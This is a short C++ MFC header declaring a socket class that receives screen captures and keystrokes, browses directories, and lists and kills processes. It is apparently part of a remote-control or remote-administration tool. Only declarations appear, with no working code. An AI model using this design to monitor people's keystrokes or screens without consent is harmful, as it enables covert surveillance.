#pragma once
#include <afxwin.h>
#include <sstream>
// CReceivingSocket command target

class CReceivingSocket : public CSocket
{
public:
	CReceivingSocket();
	virtual ~CReceivingSocket();
	virtual void OnReceive(int nErrorCode);
	virtual void OnClose(int nErrorCode);
	BOOL OnReceiveCapScreen(int nErrorCode);
	void OnReceiveKeystroke(int nErrorCode);
	void OnReceiveBrowseDir(int nErrorCode);
	void OnReceivePro(int nErrorCode);
	bool OnReceivePro_Kill(int nErrorCode, int Pid);
private:
	UINT_PTR m_timerId = NULL;
};


